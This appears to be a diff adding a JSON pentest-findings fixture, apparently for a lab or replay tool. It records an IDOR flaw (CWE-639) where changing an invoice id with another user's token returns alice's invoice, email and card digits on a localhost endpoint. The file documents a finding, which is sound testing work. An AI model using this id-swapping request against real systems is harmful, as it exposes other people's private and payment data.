@@ -1,0 +1,39 @@
+{
+  "tool": "manual-pentest",
+  "findings": [
+    {
+      "title": "IDOR on invoice endpoint",
+      "severity": "high",
+      "category": "idor",
+      "cwe": "CWE-639",
+      "description": "Invoices of other users are returned when changing the numeric id.",
+      "exchange_indexes": [
+        0
+      ]
+    }
+  ],
+  "exchanges": [
+    {
+      "timestamp": "2026-11-14T10:20:55Z",
+      "request": {
+        "method": "GET",
+        "url": "http://localhost:8001/api/invoices/1001",
+        "headers": {
+          "Authorization": "Bearer bob-token"
+        }
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "id": 1001,
+          "owner": "alice",
+          "owner_email": "alice@lab.vulnreplay.test",
+          "card_last4": "4242"
+        }
+      }
+    }
+  ]
+}
